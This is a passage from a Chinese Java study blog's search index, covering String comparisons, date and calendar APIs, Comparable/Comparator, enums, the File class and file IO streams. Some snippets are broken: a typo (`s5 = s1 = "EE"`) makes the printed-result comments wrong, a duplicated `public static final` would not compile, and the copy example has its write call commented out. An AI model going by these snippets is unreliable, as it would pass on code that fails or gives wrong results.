3.如果拼接的结果调用intern()方法，返回值就在常量池中 */ @Test public void test3() { //此时的s1和s2的数据是声明在方法区中的字符串常量池中 String s1 = \"java\"; String s2 = \"EE\"; String s3 = \"javaEE\"; //字面量 String s4 = \"java\" + \"EE\"; //字面量的连接，在常量池中 String s5 = s1 = \"EE\"; //只要有变量名参与，就不在常量池而在堆空间中了 String s6 = \"java\" + s2; String s7 = s1 + s2; System.out.println(s3 == s4); // true System.out.println(s3 == s5); // false System.out.println(s3 == s6);// false System.out.println(s3 == s7);// false System.out.println(s5 == s6);// false System.out.println(s5 == s7);// false System.out.println(s6 == s7);// false // intern() String s8 = s5.intern(); //返回值得到的s8使用的常量池中已经存在的\"javaEE\" System.out.println(s3 == s8); // true } } 练习 练习1： 面试题2： package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create: 2021-01-19 14:38 * @功能：面试题一道， 涉及String与值传递机制 */ public class CaseTest { String str = new String(\"good\"); char[] cs = {'t', 'e', 's', 't'}; public void change(String str, char ch[]){ // 这里形参是String，是引用型数据，但是String是不可变的，这里形参相当于造了一个变量 // 但是是无法改变String的，所以还是good str = \"test ok\"; ch[0] = 'b'; // ch是数组，是引用型数据，是在堆里的，可以修改，t--\u003eb } public static void main(String[] args) { CaseTest ex = new CaseTest(); ex.change(ex.str, ex.cs); System.out.println(ex.str); // good System.out.println(ex.cs); // best } } String常用方法 package cn.xpshuai.jav","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/:0:1","tags":["Java","String","StringBuffer","StringBuilder","Java比较器","Math","时间类"],"title":"Java学习之常用类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"},{"categories":["Java学习"],"content":"时间类 JDK8之前日期和之间API package cn.xpshuai.java2; import org.junit.Test; import java.util.Date; /** * @author: 剑胆琴心 * @create: 2021-01-19 17:19 * @功能： JDK8之前日期和时间的API测试 */ public class DateTimeAPI { // 1.System类中的currentTimeMillis() @Test public void test1() { long time = System.currentTimeMillis(); //返回有计算机元年之间以毫秒为单位的时间差, 时间戳 System.out.println(time); } /** * java.util.Date类 * | --- java.sql.Date类(对应数据库中的日期类型的变量) * * java.util.Date类： * 1.两个构造器的使用 * Date() * Date(1611048522028L); * 2.两个常用方法： * getTime()：获取当前时间的时间戳 * toString()：显示当前时间 * * * java.sql.Date类 * 1.如何实例化 * 2.如果有sql.Date，如何转换为util.Date对象 --\u003e多态赋值就行 * 3.util.Date，如何转换为sql.Date对象(父类往子类转) * * */ @Test public void test2() { // 构造器1 Date date1 = new Date(); System.out.println(date1.toString()); // Tue Jan 19 17:28:03 CST 2021 System.out.println(date1.getTime()); //long型是值，毫秒数，时间戳 // 构造器2:创建指定毫秒数的Date对象 Date date2 = new Date(1611048522028L); System.out.println(date2.toString()); // Tue Jan 19 17:28:03 CST 2021 //创建java.sql.Date对象 java.sql.Date date3 = new java.sql.Date(1611048522028L); System.out.println(date3); //util.Date，如何转换为sql.Date对象(父类往子类转) // 情况1 // Date date4 = new java.sql.Date(1611048522028L); // java.sql.Date date5 = (java.sql.Date)date4; // 情况2： Date date6 = new Date(); java.sql.Date date7 = new java.sql.Date(date6.getTime()); } } java.text.SimpleDateFormat类 Date类的API不易于国际化，大部分被废弃了，java.text.SimpleDateFormat类是一个不与语言环境有关的方式来格式化和解析日期的具体类。 它允许进行格式化:日期→文本、解析:文本→日期 格式化: simpleDateFormat() : //默认的模式和语言环境创建对象 public SimpleDateFormat(String pattern): //该构造方法可以用参数pattern指定的格式创建一个对象，该对象调用: public String format(Date date): //方法格式化时间对象date 解析: public Date parse(String source): //从给定字符串的开始解析文本，以生成一个日期 java.util.Calendar类： Calendar是一个抽象基类，主用用于完成日期字段之间相互操作的功能. 获取Calendar实例的方法 使用Calendar.getInstance()方法 调用它的子类GregorianCalendar的构造器。 一个Calendar的实例是系统时间的抽象表示，通过get(int field)方法来取得想要的时间信息。比如YEAR、MONTH、DAY_OF_WEEK、HOUR_OF_DAYMINUTE、SECOND public void set(int field,int value) public void add(int field,int amount) public final Date getTime() public final void setTime(Date date) 注意: 获取月份时:一月是0，二月是1，以此类推，12月是11 获取星期时:周日是1，周二是2，。。。。周六是7 package cn.xpshuai.java2; import org.junit.Test; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Calendar; import java.util.Date; /** * @author: 剑胆琴心 * @create: 2021-01-23 21:35 * @功能： * * * 1.system的currentTImeMills() * 2. java.util.Date和java.sql.Date * 3.java.util.SimpleDateFormat * 4.Calendar */ public class SimpleDateFormatTest { /* SimpleDateFormat: 对日期Date类的格式化和解析 格式化：日期--\u003e字符串 解析: 字符串 --\u003e 日期 */ @Test public void testSimpleDateFormat() throws ParseException { //实例化：使用默认构造器 SimpleDateFormat sdf = new SimpleDateFormat(); //格式化 Date date = new Date(); String format_Str = sdf.format(date); System.out.println(format_Str); //解析 String str = \"2020-12-30 上午8:11\"; Date date1 = sdf.parse(str); //抛异常 System.out.println(date1); System.out.println(date1.getTime()); System.out.println(\"**********\"); //实例化：调用带参构造器(开发中这么指定格式的方式用得多) SimpleDateFormat sdf2 = new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\"); String str2 = sdf2.format(date); System.out.println(str2); //解析: 要求字符串必须符合通过构造器参数体现的这个实例的格式 System.out.println(sdf2.parse(\"2021-01-23 09:47:37\")); } /* Calendar 日历类 */ @Test public void testCalendar(){ //1.实例化 //方式1: 创建其子类(GregorianCalendar)的对象 //方式2: 调用它的静态方法: getInstance() -- 常用 Calendar calendar = Calendar.getInstance(); System.out.println(calendar.getClass()); //2.常用方法 //get() int days = calendar.get(Calendar.DAY_OF_MONTH); //当前时间是这个月的第几天 System.out.println(days); System.out.println(calendar.get(Calendar.DAY_OF_YEAR)); // 当前是这个年的第几天 //set() calendar.set(Calendar.DAY_OF_MONTH, 22); //修改值 int days2 = calendar.get(Calendar.DAY_OF_MONTH); System.out.println(days2); //现在本身已经改了(可变的) //add() calendar.add(Calendar.DAY_OF_MONTH, 3); //在原基础加上三天 calendar.add(Calendar.DAY_OF_MONTH, -3); //在原基础减去三天 //getTime()：日历类--\u003eDate Date date = calendar.getTime(); // //setTime(): Date --\u003e 日历类 Date da = new Date(); calendar.setTime(da); calendar.getTime(); } } J","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/:0:2","tags":["Java","String","StringBuffer","StringBuilder","Java比较器","Math","时间类"],"title":"Java学习之常用类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"},{"categories":["Java学习"],"content":"Java比较器(重要) 涉及到对象排序，就要用下面两种，至于用哪种就自己选吧 java.lang.Comparable 一劳永逸，一旦实现，在任何位置都可以比较大小 java.util.Comparator 临时用一下时候的比较 Comparable package cn.xpshuai.java3; import org.junit.Test; import java.util.Arrays; /** * @author: 剑胆琴心 * @create: 2021-01-24 17:07 * @功能： Java比较器 * * Java中的对象，正常情况下只能进行比较；==, !=, 不能使用: \u003e \u003c * 但是在开发场景中，我们需要对多个对象进行排序可以比较大小 *实现对象排序的方式有两种： * - 自然排序: java.lang.Comparable * - 定制排序: java.util.Comparator * * * 1.Comparable接口 * * * 2.Comparator接口 */ public class ComparableTest { /* Comparable使用举例 1.String等包装类实现了Comparable接口，重写了compareTo()方法,给出了比较两个对象大小的实现 2.String等包装类重写compareTo()以后，进行了从小到大排列 3.实现compareTo()的规则: 如果当前对象this大于形参对象，则返回正整数； 如果当前对象this小于形参对象，则返回负整数； 如果当前对象this等于形参对象obj，则返回0。 */ @Test public void test1(){ String[] arr = new String[]{\"DD\", \"GG\", \"BB\", \"JJ\",\"MM\",\"AA\"}; Arrays.sort(arr); //排序(其实也是String实现了Comparable接口) } } 自定义类实现Comparable自然排序 自定义类： package cn.xpshuai.java3; /** * @author: 剑胆琴心 * @create: 2021-01-24 17:26 * @功能： */ public class Goods implements Comparable{ private String name; private double price; public Goods() { } public Goods(String name, double price) { this.name = name; this.price = price; } public String getName() { return name; } public void setName(String name) { this.name = name; } public double getPrice() { return price; } public void setPrice(double price) { this.price = price; } @Override public String toString() { return \"Goods{\" + \"name='\" + name + '\\'' + \", price=\" + price + '}'; } //实现这个方法 //指明商品比较大小的方式(这里自定义比较价格从低到高排序，如果需要，可以继续嵌套比较) @Override public int compareTo(Object o) { if(o instanceof Goods){ Goods goods = (Goods)o; if(this.price \u003e goods.price){ return 1; }else if(this.price \u003c goods.price){ return -1; }else { // return 0; return this.name.compareTo(goods.name); //如果需要，可以继续嵌套比较, 比如价格一样就再比较商品名称 } } throw new RuntimeException(\"传入的数据类型不一致!\"); } } package cn.xpshuai.java3; import org.junit.Test; import java.util.Arrays; /** * @author: 剑胆琴心 * @create: 2021-01-24 17:07 * @功能： Java比较器 * * Java中的对象，正常情况下只能进行比较；==, !=, 不能使用: \u003e \u003c * 但是在开发场景中，我们需要对多个对象进行排序可以比较大小 *实现对象排序的方式有两种： * - 自然排序: java.lang.Comparable * - 定制排序: java.util.Comparator * * * 1.Comparable接口 * * * 2.Comparator接口 */ public class ComparableTest { /* Comparable(自然排序)使用举例 1.String等包装类实现了Comparable接口，重写了compareTo()方法,给出了比较两个对象大小的实现 2.String等包装类重写compareTo()以后，进行了从小到大排列 3.实现compareTo()的规则: 如果当前对象this大于形参对象，则返回正整数； 如果当前对象this小于形参对象，则返回负整数； 如果当前对象this等于形参对象obj，则返回0。 4.对于自定义类，如果需要排序，可以让自定义类实现Comparable接口，重写compareTo()方法 在compareTo(obj)写如何排序 */ @Test public void test1(){ String[] arr = new String[]{\"DD\", \"GG\", \"BB\", \"JJ\",\"MM\",\"AA\"}; Arrays.sort(arr); //排序(其实也是String实现了Comparable接口) } /* 【自定义类实现Comparable自然排序】 这里自定义类是Goods.java 对于自定义类，如果需要排序，可以让自定义类实现Comparable接口，重写compareTo()方法 在compareTo(obj)写如何排序 */ @Test public void test2(){ Goods[] arr = new Goods[4]; arr[0] = new Goods(\"联想\", 65); arr[1] = new Goods(\"小米\", 12); arr[2] = new Goods(\"华为\", 65); arr[3] = new Goods(\"罗技\", 101); Arrays.sort(arr); //原始情况下，不能执行，需要在自定义类中实现并重写 System.out.println(Arrays.toString(arr)); // 继承并重写之后 } } Comparator接口 /* Comparator接口(定制排序) 1.背景: 当元素的类型没有实现java.Lang.ComparabLe接口而又不方便修改代码, 或者实现了java.Lang.comparable接口的排序规则不适合当前的操作, 那么可以考怎使用Comparator的对象来排序 2.重写compare(Object o1,0bject o2)方法，比较o1和o2的大小: 如果方法返回正整数,则表示o1大于o2 如果方法返回负整数,则表示o1小于o2 如果方法返回0,则表示o1等于o2 */ @Test public void test3() { String[] arr = new String[]{\"DD\", \"GG\", \"BB\", \"JJ\",\"MM\",\"AA\"}; Arrays.sort(arr, new Comparator\u003cString\u003e() { //使用匿名内部类 @Override public int compare(String o1, String o2) { //实现compare方法 //指明o1和o2怎么排 if(o1 instanceof String \u0026\u0026 o2 instanceof String){ String s1 = (String)o1; String s2 = (String)o2; return -s1.compareTo(s2); //从大到小来排列 } throw new RuntimeException(\"输入的类型不一致\"); } }); } 自定义类实现Comparator定制排序 自定义类: // Goods类，同前面 /* 【自定义类实现Comparator定制排序】 这里自定义类是Goods.java */ @Test public void test4(){ Goods[] arr = new Goods[4]; arr[0] = new Goods(\"联想\", 65); arr[1] = new Goods(\"小米\", 12); arr[2] = new Goods(\"华为\", 65); arr[3] = new Goods(\"罗技\", 101); arr[3] = new Goods(\"罗技\", 100); Arrays.sort","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/:0:3","tags":["Java","String","StringBuffer","StringBuilder","Java比较器","Math","时间类"],"title":"Java学习之常用类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"},{"categories":["Java学习"],"content":"System类 ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/:0:4","tags":["Java","String","StringBuffer","StringBuilder","Java比较器","Math","时间类"],"title":"Java学习之常用类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"},{"categories":["Java学习"],"content":"Math类 ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/:0:5","tags":["Java","String","StringBuffer","StringBuilder","Java比较器","Math","时间类"],"title":"Java学习之常用类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"},{"categories":["Java学习"],"content":"BigInteger与BigDecimal ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/:0:6","tags":["Java","String","StringBuffer","StringBuilder","Java比较器","Math","时间类"],"title":"Java学习之常用类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%B1%BB/"},{"categories":["Java学习"],"content":"概述 枚举类的实现 JDK1.5之前需要自定义枚举类 JDK 1.5新增的enum关键字用于定义枚举类 若枚举只有一个对象,则可以作为一种单例模式的实现方式。 枚举类的属性 枚举类对象的属性不应允许被改动,所以应该使用private final修饰 枚举类的使用private final修饰的属性应该在构造器中为其赋值 若枚举类显式的定义了带参数的构造器,则在列出枚举值时也必须对应的传入公数 定义枚举类(两种方式) package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create: 2021-01-24 18:18 * @功能：枚举类 * * 类的对象只有有限个、确定的。我们称此类为枚举类 * 当需要定义一组常量时，强烈建议使用枚举类 * 如果枚举类中只有一个对象，则可以作为单例模式的实现方式。 * * * 如何定义枚举类 * 方法1：jdk5.0之前：之定义枚举类 * 方法2：jdk5.0，可以使用enum关键字定义枚举类(常用) */ public class EnumTest { public static void main(String[] args) { Season spring = Season.SPRING; System.out.println(spring); // //jdk5.0，可以使用enum关键字定义枚举类(常用) //定义的枚举类继承于java.lang.Enum Season1 spring1 = Season1.SPRING; System.out.println(spring1); System.out.println(Season1.class.getSuperclass()); } } //jdk5.0之前：自定义枚举类 class Season{ //1.声明Season对象的属性 private final String seasonName; private final String seasonDesc; //2.私有化类的构造器, 并给对象属性赋值 private Season(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.提供当前枚举类的对象的多个对象 public static final public static final Season SPRING = new Season(\"春天\", \"春暖花开\"); public static final Season SUMMER = new Season(\"夏天\", \"夏日炎炎\"); public static final Season AUTOM = new Season(\"秋天\", \"秋高气爽\"); public static final Season WINTER = new Season(\"冬天\", \"冰天雪地\"); //4.其他诉求：获取枚举类对象的属性 public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.其他诉求：提供toString() @Override public String toString() { return \"Season{\" + \"seasonName='\" + seasonName + '\\'' + \", seasonDesc='\" + seasonDesc + '\\'' + '}'; } } // //jdk5.0，可以使用enum关键字定义枚举类(常用) enum Season1{ // 1.提供当前枚举类的帝乡，多个对象之间用,隔开 SPRING(\"春天\", \"春暖花开\"), SUMMER(\"夏天\", \"夏日炎炎\"), AUTOM(\"秋天\", \"秋高气爽\"), WINTER(\"冬天\", \"冰天雪地\"); //2.声明Season对象的属性 private final String seasonName; private final String seasonDesc; //2.私有化类的构造器, 并给对象属性赋值 private Season1(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.提供当前枚举类的对象的多个对象 public static final //4.其他诉求：获取枚举类对象的属性 public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.其他诉求：提供toString() } Enum类的主要方法 package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create: 2021-01-24 18:18 * @功能：枚举类 * * 类的对象只有有限个、确定的。我们称此类为枚举类 * 当需要定义一组常量时，强烈建议使用枚举类 * 如果枚举类中只有一个对象，则可以作为单例模式的实现方式。 * * * 如何定义枚举类 * 方法1：jdk5.0之前：之定义枚举类 * 方法2：jdk5.0，可以使用enum关键字定义枚举类(常用) * * * Enum中常用方法： * value() 返回枚举类型的对象数据 * valueOf() 可以把一个字符串转为对应的枚举类对象（要求字符串必须是枚举类对象的\"名字\"） * toString() 返回当前枚举类对象常量的名称 */ public class EnumTest { public static void main(String[] args) { Season spring = Season.SPRING; System.out.println(spring); // //jdk5.0，可以使用enum关键字定义枚举类(常用) //定义的枚举类继承于java.lang.Enum Season1 spring1 = Season1.SPRING; // toString() System.out.println(spring1); System.out.println(Season1.class.getSuperclass()); //values() Season1[] values = Season1.values(); for (int i = 0; i \u003c values.length; i++) { System.out.println(values[i]); } // valueOf(String objName): 根据提供objName, 返回枚举类中对象名是objName的对象 // 如果没有，则抛出异常 Season1 winter = Season1.valueOf(\"WINTER\"); System.out.println(winter); } } //jdk5.0之前：自定义枚举类 class Season{ //1.声明Season对象的属性 private final String seasonName; private final String seasonDesc; //2.私有化类的构造器, 并给对象属性赋值 private Season(String seasonName, String seasonDesc){ this.seasonName = seasonName; this.seasonDesc = seasonDesc; } //3.提供当前枚举类的对象的多个对象 public static final public static final Season SPRING = new Season(\"春天\", \"春暖花开\"); public static final Season SUMMER = new Season(\"夏天\", \"夏日炎炎\"); public static final Season AUTOM = new Season(\"秋天\", \"秋高气爽\"); public static final Season WINTER = new Season(\"冬天\", \"冰天雪地\"); //4.其他诉求：获取枚举类对象的属性 public String getSeasonName() { return seasonName; } public String getSeasonDesc() { return seasonDesc; } //4.其他诉求：提供toString() @Override public String toString() { return \"Season{\" + \"seasonName='\" + seasonName + '\\'' + \", seasonDesc='\" + seasonDesc + '\\'' + '}'; } } // //jdk5.0，可以使用enum关键字定义枚举类(常用) enum Season1{ // 1.提供当前枚举类","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9E%9A%E4%B8%BE%E7%B1%BB/:0:0","tags":["Java","枚举类","Enum","学习记录"],"title":"Java学习之枚举类","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9E%9A%E4%B8%BE%E7%B1%BB/"},{"categories":["Java学习"],"content":"File类的使用 java.io.File类:文件和文件目录路径的抽象表示形式，与平台无关 File能新建、删除、重命名文件和目录，但 File不能访问文件内容本身。如果需要访问文件内容本身，则需要使用输入/输出流。 想要在Java程序中表示一个真实存在的文件或目录，那么必须有一个File对象，但是Java程序中的一个File对象，可能没有一个真实存在的文件或目录。 File对象可以作为参数传递给流的构造器 * 1. File类的一个对象，代表一个文件或一个文件目录(俗称:文件夹) * 2. File类声明在java.io包下 * 3.File类中涉及到关于文件或文件目录的创建、删除、重命名、修改时间、文件大小等方法，并未涉及到写入或读取文件内容的操作。如果需要读取或写入文件内容，必须使用Io流来完成。 * 4.后续File类的对象通常会作为参数传递到流的构造器中，指明读取或写入的\"终点\" 创建File类的实例: 常用构造器： # public File(String pathname) 以pathname为路径创建File对象，可以是绝对路径或者相对路径，如果pathname是相对路径，则默认的当前路径在系统属性user.dir中存储。 绝对路径:是一个固定的路径,从盘符开始 相对路径:是相对于某个位置开始 # public File(String parent,String child) 以parent为父路径，child为子路径创建File对象。 # public File(File parent,String child) 根据一个父File对象和子文件路径创建File对象 路径分隔符： 路径中的每级目录之间用一个路径分隔符隔开 路径分隔符和系统有关: windows和DOS系统默认使用\\来表示 UNIX和URL使用/来表示 Java程序支持跨平台运行，因此路径分隔符要慎用。 为了解决这个隐患，File类提供了一个常量:public static final String separator。根据操作系统，动态的提供分隔符。举例: File file1 = new File(\"d:\\\\hello.txt\"); File file2 = new File(\"d:\" + File.separator + \"hello.txt\"); File file3 = new File(\"d:/hello.txt\"); /* 1.如何创建File类的实例 File(String filePath) File(String parentPath, String childPath) File(File parentPath, String childPath) 2.相对路径、绝对路径 3.路径分隔符 * */ @Test public void test(){ //构造器1： //相对路径(相较于某个路径下，指明的路径:这里的IDEA中相对于当前module中) File file1 = new File(\"hello.txt\"); //绝对路径 File file2 = new File(\"d:\\\\hello.txt\"); // 为了解决不同操作系统下路径分隔符的隐患，File类提供了一个常量:`public static final String separator`。根据操作系统，动态的提供分隔符 File file3 = new File(\"d:\" + File.separator + \"hello.txt\"); //构造器2： File file4 = new File(\"d:\\\\Code\", \"JavaCode\"); //构造器3： File file5 = new File(file4, \"1.txt\"); } 常用方法 File类的获取功能 public String getAbsolutePath():获取绝对路径 public String getPath():获取路径 public String getName():获取名称 public String getParent():获取上层文件目录路径。若无，返回null public long length():获取文件长度（即:字节数）。不能获取目录的长度。 public long lastModified():获取最后一次的修改时间，毫秒值 # 以下两个适用于文件目录 public String[] list():获取指定目录下的所有文件或者文件目录的名称数组 public File[] listFiles():获取指定目录下的所有文件或者文件目录的File数组 File类的重命名功能 public boolean renameTo(File dest):把文件重命名为指定的文件路径 File类的判断功能 public boolean isDirectory():判断是否是文件目录 public boolean isFile():判断是否是文件 public boolean exists() :判断是否存在 public boolean canRead():判断是否可读 public boolean canWrite():判断是否可写 public boolean isHidden():判断是否隐藏 File类的创建功能: public boolean createNewFile():创建文件。若文件存在，则不创建，返回false public boolean mkdir() :创建文件目录。如果此文件目录存在，就不创建了。如果此文件目录的上层目录不存在，也不创建。 public boolean mkdirs():创建文件目录。如果上层文件目录不存在，一并创建 # 注意事项:如果你创建文件或者文件目录没有写盘符路径，那么，默认在项目路径下。 File类的删除功能: public boolean delete():删除文件或者文件夹 # 删除注意事项: Java中的删除不走'回收站'。 要删除一个文件目录，请注意该文件目录内不能包含文件或者文件目录 代码： @Test public void test1(){ File file1 = new File(\"hello.txt\"); File file2 = new File(\"d:\\\\io\\\\1.txt\"); System.out.println(file1.getAbsolutePath()); System.out.println(file1.getName()); //如果只是在内存中，没有创建，获取的值是null System.out.println(file1.getParent()); // 相对路径一般是获取不到父级目录的 System.out.println(file1.getAbsoluteFile()); System.out.println(file1.length()); System.out.println(file1.lastModified()); System.out.println(\"***********\"); System.out.println(file2.getAbsolutePath()); // d:\\io System.out.println(file2.getName()); // d:\\io System.out.println(file2.getParent()); // d:\\io System.out.println(file2.getAbsoluteFile()); // d:\\io\\1.txt System.out.println(file2.length()); System.out.println(new Date(file2.lastModified())); System.out.println(\"***********\"); // # 适用于文件目录 File file3 = new File(\"E:\\\\Code\"); //获取文件名 String[] list = file3.list(); for (String s: list){ System.out.println(s); } //绝对路径的形式显示出来 File[] list2 = file3.listFiles(); for (File f: list2){ System.out.println(f); } //重命名 // public boolean renameTo(File dest):把文件重命名为指定的文件路径 //要想返回true，需保证：file4在硬盘中存在，且file5不能存在 File file4 = new File(\"d:\\\\io\\\\2.txt\"); File file5 = new File(\"d:\\\\io\\\\222222.txt\"); //file4命名为file5(file4就没了，file5就存在了) boolean renameTo = file4.renameTo(file5); System.out.println(renameTo); // public boolean isDirectory():判断是否是文件目录 System.out.println(file3.isDirectory()); // public boolean isFile():判断是否是文件 System.out.println(file3.isFile()); // public boo","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:1","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"IO流原理及流的分类 l/O是Input/Outpqt的缩写，I/O技术是非常实用的技术，用于处理设备之间的数据传输。如读/写文件，网络通讯等。 Java程序中，对于数据的输入/输出操作以“流(stream)”的方式进行。 java.io包下提供了各种“流”类和接口，用以获取不同种类的数据，并通过标准的方法输入或输出数据。 输入input: 读取外部数据（磁盘、光盘等存储设备的数据）到程序（内存)中。 输出output: 将程序（内存)数据输出到磁盘、光盘等存储设备中。 我们要站在程序的角度 流的分类 按操作数据单位不同分为:字节流(8 bit – bytes)，字符流(16 bit — char) 按数据流的流向不同分为: 输入流(数据—\u003e程序)，输出流(程序–\u003e数据) 按流的角色的不同分为:节点流(直接作用在文件上的)，处理流(这个流的对象作为外面的流的参数，包了一层，加快了传输速度) （抽象基类） 字节流 字符流 输入流 InputStream Reader 输出流 OutputStream Writer Java的IO流共涉及40多个类，实 际上非常规则，都是从如上4个抽象基类派生的。 由这四个类派生出来的子类名称都是以其父类名作为子类名后缀（比如后缀带Stream的都是字节，后缀带Reader或Writer的都是字节）。 深色的为重点 ","date":"2021-01-30","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/:0:2","tags":["Java","IO流","文件","学习记录"],"title":"Java学习之IO流","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8Bio%E6%B5%81/"},{"categories":["Java学习"],"content":"节点流(或文件流) 字符流 FileReader FileWriter 字符流不能读取图片等字节数据 代码： /* 字符流： FileReader FileWriter Note: 1. read()的理解:返回读入的一个字符。如果达到文件末尾，返回-1 2．异常的处理:为了保证流资源一定可以执行关闭操作。需要使用try-catch-finally处理 3. 读入的文件一定要存在 */ @Test public void test(){ //如果是在main方法中，则相对路径是相对于当前工程 //【功能】：读取文件内容到程序中，并输出到控制台 FileReader fr = null; try{ //1.实例化File类的对象，指明要操作的文件 File file = new File(\"d:\\\\io\\\\1.txt\"); //2.提供具体的流 fr = new FileReader(file); //3.数据的读入 //read():返回读入的一个字符，如果达到文件末尾，返回-1 //方式1： // int data = fr.read(); // 返回-1表示读完了 // while (data != -1){ // System.out.println((char) data); // data = fr.read(); //继续向后读 // } //方式2: int data; while ((data = fr.read()) != -1){ System.out.println((char) data); } }catch (Exception e) { e.printStackTrace(); }finally { //4.流的关闭 try{ if(fr != null){ fr.close(); } }catch (Exception e){ e.printStackTrace(); } } } /* FileReader(char[] cbuf)读入数据 对read()操作升级: 使用read的重载方法 */ @Test public void test1(){ FileReader fr = null; try{ //1.实例化File类的对象，指明要操作的文件 File file = new File(\"d:\\\\io\\\\1.txt\"); //2.FileReader的实例化，提供具体的流 fr = new FileReader(file); //3.数据的读入操作（难点）： char[] cbuf = new char[5]; //每次读入cbuf数组长度个字符的个数，如果达到文件末尾则返回-1 int len; while ((len = fr.read(cbuf)) != -1){ //方式1： for (int i = 0; i \u003c len; i++) { System.out.print(cbuf[i]); } //方式2： // String str = new String(cbuf, 0,len); //从0开始每次取len个 // System.out.println(str); } }catch (Exception e) { e.printStackTrace(); }finally { //4.流资源的关闭 try{ if(fr != null){ fr.close(); } }catch (Exception e){ e.printStackTrace(); } } } /* FileWriter(): 从内存中写出数据到硬盘的文件中 1．输出操作，对应的FiLe是可以不存在的。 如果不存在，在输出的过程中，会自动创建此文件。 如果存在，默认参数append:false会对原有文件的覆盖; true则在原有文件基础上添加 即: 如果流使用的构造器是:FiLewriter(fiLe,false)/FiLewriter(fiLe):对原有文件的覆盖 如果流使用的构造器是:FiLewriter(file,true):不会对原有文件覆盖，而是在原有文件基础上追加内容 */ @Test public void test2(){ FileWriter fw = null; try{ // 1.提供File类的对象，指明写出到的文件 File file = new File(\"d:\\\\io\\\\11.txt\"); //2.提供FileWriter的对象，用于数据的写出 fw = new FileWriter(file, false); //3.写出的操作 fw.write(\"hhh hhh hdaldk\\n\"); fw.write(\"hhh 222 hdaldk\\n\"); }catch (Exception e){ e.printStackTrace(); }finally { try { //4.流资源的关闭 fw.close(); }catch (Exception e){ e.printStackTrace(); } } } /* 使用FileReader和FileWriter实现文本文件的复制 */ @Test public void test3() { FileReader fr = null; FileWriter fw = null; try { // 1.创建File类的对象，指明读入和写出的文件 File srcFile = new File(\"d:\\\\io\\\\1.txt\"); File dstFile = new File(\"d:\\\\io\\\\111.txt\"); // 2.创建输入流和输出流的操作 fr = new FileReader(srcFile); fw = new FileWriter(dstFile); // 3.数据的读入和写出操作 char[] cbuf = new char[5]; int len; //每次读入cbuf数组长度个字符的个数 while ((len = fr.read(cbuf)) != -1) { // fw.write(cbuf, 0, len); //每次写出len个字符 } // 4.关闭流资源 }catch(Exception e){ e.printStackTrace(); }finally{ try { if(fr != null){ fr.close(); } } catch (Exception e) { e.printStackTrace(); }finally { try { if(fw != null){ fw.close(); } } catch (Exception e) { e.printStackTrace(); } } } } 字节流 FileInputStream FileOutputStream /* 字节流： FileInputStream FileOutputStream 结论：FileInputStream 对于文本文件，还是要用字符流 对于图片等，还是要用字节流 */ @Test public void test4(){ FileInputStream fis = null; try{ //1.造文件 File file = new File(\"d:\\\\io\\\\1.txt\"); //2.造流 fis = new FileInputStream(file); //3.读数据 byte[] buffer = new byte[5]; int len; //记录每次读取的字节的个数 while ((len = fis.read(buffer)) != -1){ String str = new String(buffer,0, len); System.out.println(str); // 这样中文可能乱码，因为uft-8中文一个字是占3个字节 } // File file = new File(\"d:\\\\io\\\\1.txt\"); }catch (Exception e){ System.out.println(e.getMessage()); }finally { //4.关闭资源 try{ fis.close(); }catch (Exception e){ e.printStackTrace(); } } } /* FileOutputStream 实现对图片的复制操作 如果只是相对文本文件进行复制操作，也可以使用字节流 */ @Test public void test5(){ FileInputStream fis = null; FileOutputStream fos = null; try{ //1.造文件 File srcFile = new File(\"d:\\\\io\\\\1.png\"); File dstFile = new File(\"d:\\\\io\\\\2.png\"); //2.造流 fis = new FileInputStream(srcFile); fos = new FileOutputStream(dstFile); //3.复制的过程 byte[] buffer = new byte[10]; int len; //记录每次读入的字节的个数 while ((len = fis.read(buffer)) != -1){ fos.write(buffer, 0, len); // 每次写10个字节 } System.out.println(\"复制ok.\"); }catch (Exception 